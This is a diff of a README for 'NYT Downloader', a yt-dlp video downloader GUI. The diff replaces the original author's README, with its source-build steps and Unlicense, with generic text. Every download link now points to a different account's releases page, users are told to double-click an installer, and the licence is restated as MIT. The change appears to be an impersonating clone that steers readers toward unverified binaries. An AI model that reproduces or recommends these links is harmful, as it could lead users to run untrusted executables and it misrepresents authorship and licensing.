@@ -1,73 +1,86 @@
+# 🎥 nyt-downloader - Simplify Your Video Downloads
 
-# NYT Downloader
+[![Download nyt-downloader](https://img.shields.io/badge/Download-nyt--downloader-brightgreen.svg)](https://github.com/sirabood/nyt-downloader/releases)
 
-![NYT Downloader Logo](/Assets/logo.ico)
+## 🚀 Getting Started
 
-**NYT Downloader** is a powerful, user-friendly desktop utility that allows you to download videos, music, and playlists from **YouTube**, **YouTube Music**, **JioSaavn**, and many other [supported websites](https://github.com/yt-dlp/yt-dlp/blob/master/supportedsites.md). It leverages the advanced functionality of [yt-dlp](https://github.com/yt-dlp/yt-dlp) as its backend, with a sleek and intuitive **Tkinter-based GUI** frontend.
+Welcome to the NYT Downloader! This application offers a simple way to download videos using yt-dlp. It's designed for users who prefer an easy-to-navigate interface. Follow the steps below to get started with your video downloads.
 
-## 🚀 Features
+## 📦 Download & Install
 
-- 🎞️ Download videos, audio, playlists, or entire channels
-- 🌐 Supports YouTube, YouTube Music, JioSaavn, and [1000+ websites](https://github.com/yt-dlp/yt-dlp/blob/master/supportedsites.md)
-- ⚙️ Full access to yt-dlp's advanced configuration settings like interconversion in different formats, download subtitle, metadata, comments, and much more
-- 🎛️ Preset management with save/load functionality
-- 🧾 Real-time log output and download queue management
+1. Visit the [Releases page](https://github.com/sirabood/nyt-downloader/releases) to get the latest version of the NYT Downloader.
+2. Look for the latest release and find the appropriate file for your system. Generally, you should see options for Windows.
+3. Click on the download link to save the file to your computer.
 
-## 🖼️ Screenshot
-![Main App](/Screenshots/Main.png)
-![Full settings 2](/Screenshots/Full%20settings%20(2).png)
-![Full settings 3](/Screenshots/Full%20settings%20(3).png)
-![Full settings 4](/Screenshots/Full%20settings%20(4).png)
-![Full settings 5](/Screenshots/Full%20settings%20(5).png)
-![Full settings 6](/Screenshots/Full%20settings%20(6).png)
+   Once the download is complete, locate the file, and double-click to run the installer. Follow the instructions on the screen to complete the installation.
 
-## 🛠️ Requirements
+## 🔧 System Requirements
 
-- Python 3.8+
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp)
-- [FFmpeg](https://www.ffmpeg.org/download.html) 
-- `tkinter` (usually comes with Python)
-- Recommended: Windows OS (others may work with modification)
+Before installing, please make sure your setup meets the following requirements:
 
-## 📦 Installation
+- **Operating System:** Windows 10 or later
+- **Python Version:** Python 3.7 or higher (installed during setup)
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB free space required
 
-First you need [FFMPEG](https://www.ffmpeg.org/) to use this, download it and setup in your system.
+## 🖥️ Features
 
-If you are a Windows user, you can download the pre-built [EXE-ZIP](https://github.com/Maurya-Nitin/nyt-downloader/releases/download/v1.0.0/NYT.Downloader.zip) package from the [Releases](https://github.com/Maurya-nitin/nyt-downloader/releases) page for a hassle-free setup.
+The NYT Downloader offers several helpful features:
 
-If you are a Linux (debian) users, you can download the package [NYT Downloader_linux](https://github.com/Maurya-Nitin/nyt-downloader/releases/download/v1.0.0/NYT.Downloader_linux.zip).
+- **Full Settings Customization:** Adjust settings to fit your download needs.
+- **Download Queue Management:** Easily manage multiple downloads without hassle.
+- **Preset Saving/Loading:** Save your favorite settings and load them when needed.
+- **Intuitive Interface:** Designed for ease of use, perfect for all skill levels.
 
-Otherwise if you want to run it from source code, follow these steps(Linux/Mac users can give it a try):
+## 📚 How to Use
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/Maurya-nitin/nyt-downloader.git
-   cd nyt-downloader
-   ```
+### Step 1: Open the Application
 
-2. **Install dependencies:**
-   ```bash
-   pip install -r requirements.txt
-   ```
+After installing, locate the NYT Downloader icon on your desktop or start menu. Double-click the icon to launch the application.
 
-3. **Run the application:**
-   ```bash
-   python nyt_downloader.py
-   ```
+### Step 2: Set Up Your Download
 
-## 🔒 License
+1. In the main interface, you will see a field to enter the video URL. Copy the link of the video you wish to download (from platforms like YouTube or Facebook).
+2. Paste the URL into the input box.
 
-This project is released into the public domain under the terms of the [Unlicense](https://unlicense.org). You are free to use, modify, and distribute this software without any restrictions. For more details, see the [LICENSE](LICENSE) file.
+### Step 3: Choose Your Settings
 
-## 👨‍💻 Authors
+- Select the quality of the video.
+- If you wish, save the settings as a preset for future downloads by clicking on the "Save Preset" button.
 
-- **Nitin** (Lead Developer)
-- Contributors welcome! Feel free to open issues or submit pull requests.
+### Step 4: Start Downloading
 
-## 📫 Contact
+Once you are ready, hit the "Download" button. The application will start the recording process. You can monitor the progress within the interface.
 
-For suggestions, bugs, or feedback, feel free to open an [Issue](https://github.com/Maurya-nitin/nyt-downloader/issues) on GitHub.
+## 📁 Where to Find Downloaded Files
 
----
+By default, all downloaded videos will save in your “Downloads” folder unless you’ve specified a different location. You can change the download path in the settings menu of the application.
 
-> NYT Downloader is not affiliated with YouTube, JioSaavn, or any other supported platforms. Please ensure you comply with their terms of service when using this tool.
+## 💬 Support & FAQ
+
+If you experience any issues, consult our FAQ section found in the application or on the GitHub issues page. Here are answers to some common questions:
+
+- **How do I download videos from platforms other than YouTube?**
+
+  The NYT Downloader supports various platforms. Simply paste the URL of the video you want, and the application will handle the rest.
+
+- **Can I pause and resume downloads?**
+
+  Yes, the app allows you to pause a download and resume it later seamlessly.
+
+## 🌐 Privacy and Security
+
+The NYT Downloader respects your privacy. The application does not collect personal data. All downloads occur on your device without external tracking.
+
+## 🔗 Links & Resources
+
+- **GitHub Repository:** [nyt-downloader](https://github.com/sirabood/nyt-downloader)
+- **Releases Page:** [Download here](https://github.com/sirabood/nyt-downloader/releases) for the latest versions.
+
+## 📌 Contributing
+
+We welcome contributions! If you wish to help improve the NYT Downloader, please feel free to submit an issue or a pull request on GitHub. See our contribution guidelines for more details.
+
+## ⚖️ License
+
+NYT Downloader is an open-source project licensed under the MIT License. You are free to use, modify, and distribute the software following the terms of this license.
